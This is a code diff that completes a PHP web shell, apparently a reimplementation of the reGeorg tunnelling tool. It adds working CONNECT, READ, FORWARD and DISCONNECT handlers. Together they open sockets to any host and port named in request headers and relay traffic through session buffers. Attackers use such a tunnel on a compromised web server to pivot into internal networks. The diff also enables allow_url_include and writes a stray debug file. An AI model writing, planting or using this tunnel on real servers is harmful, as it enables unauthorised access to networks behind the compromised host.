@@ -1,4 +1,8 @@
 <?php
+// this is reGeorg PHP'server demo  
+//  this is available
+
+
 
 ini_set('allow_url_open', true);
 ini_set('allow_url_include', true);
@@ -32,7 +36,7 @@ if( !function_exists('apache_request_headers') ) {          # 获取apache_reque
 if ($_SERVER['REQUEST_METHOD'] == 'GET'){
     exit("Georg says, 'All seems fine'");
 }
-if ($_SERVER['REQUEST_METHOD'] == 'POST'){
+if ($_SERVER['REQUEST_METHOD'] === 'POST'){
     set_time_limit(0);                      # 让php页面脱离执行时间的限制
     $headers = apache_request_headers();
     $action = $headers['X-CMD'];
@@ -40,18 +44,139 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST'){
     // var_dump($headers);
     switch ($action){
         case "CONNECT":
-            echo "this is connect";
+            {
+                $target = $headers['X-TARGET'];
+                $port = (int)$headers['X-PORT'];
+
+                $res = fsockopen($target, $port);
+                if ($res == false){
+                    header('X-STATUS: FAIL');
+                    header('X-ERROR: connect to target is error');
+                    return;
+                }
+
+                stream_set_blocking($res,0);
+                @session_start();
+                $_SESSION['run'] = true;
+                $_SESSION['readbuf'] = '';
+                $_SESSION['writebuf'] = '';
+                ob_end_clean();
+                header('X-STATUS: OK');
+                header('Connection: close');
+                ignore_user_abort();
+                ob_start();
+                $size = ob_get_length();
+                header("Content-Length: $size");
+                ob_end_flush();
+                flush();
+                session_write_close();
+                
+
+
+                while($_SESSION['run']){
+                    
+                    $readBuf = '';
+                    @session_start();
+                    $writeBuf = $_SESSION['writebuf'];
+                    $_SESSION['writebuf'] = '';
+                    session_write_close();
+                    if ($writeBuf != ''){
+
+                        stream_set_blocking($res,0);
+                        $i = fwrite($res,$writeBuf);
+                        if ($i === false){
+
+                            @session_start();
+                            $_SESSION['run'] = false;
+                            session_write_close();
+                            header('X-STAUTS: FAIL');
+                            header('X-ERROR: the socks write to target is error');
+                        }
+                    }
+
+                    stream_set_blocking($res,0);
+                    while ($out = fgets($res,10)){
+                        if($out === false){
+                            @session_start();
+                            $_SESSION['run']= false;
+                            session_write_close();
+                            header('X-STATUS: FAIL');
+                            header('X-ERROR: the read socks is error');
+                        }
+
+                        $readBuf .= $out;
+                    }
+
+                    if ($readBuf != ''){
+                        @session_start();
+                        $_SESSION['readbuf'] .= $readBuf;
+                        session_write_close();
+                    }
+                }
+                fclose($res);
+
+            fwrite(fopen('a.txt','a'),"close\n");
+            }
         break;
         
         case "READ":
-            echo "this is read";
+        {
+            @session_start();
+            $readBufer = $_SESSION['readbuf'];
+            $_SESSION['readbuf'] = '';
+            $running = $_SESSION['run'];
+            session_write_close();
+            if ($running){
+                header("X-STATUS: OK");
+                header("Connection: Keep-Alive");
+                echo $readBufer;
+                return;
+            }else{
+                header("X-STATUS: FAIL");
+                header("X-ERROR: the server is not running");
+                return;
+            }
+        }
+
         break;
 
         case "FORWARD":
-            echo "this is forward";
+            {
+                @session_start();
+                $is_running = $_SESSION['run'];
+                session_write_close();
+                if(!$is_running){
+                    header('X-STATUS: FAIL');
+                    header("X-ERROR: FORWARD the server is not running");
+                    return;
+                }
+
+                header("Content-Type: application/octet-stream");
+                $raw_data = file_get_contents('php://input');
+                if($raw_data){
+                    @session_start();
+                    $_SESSION['writebuf'] .= $raw_data;
+                    session_write_close();
+					header('X-STATUS: OK');
+                    header("Connection: Keep-Alive");
+                    return;
+                }else{
+                    header("X-STATUS: FAIL");
+                    header("X-ERROR: the post data is not recv");
+                }
+            }
+        break;
 
         case "DISCONNECT":
-            echo "this is disconnect";
+            {
+                @session_start();
+                $_SESSION['run'] = false;
+                session_write_close();
+                header('X-STATUS: FAIL');
+                header('X-ERROR: connect is over close the server');
+                return;
+            }
+        break;
     }
 
 
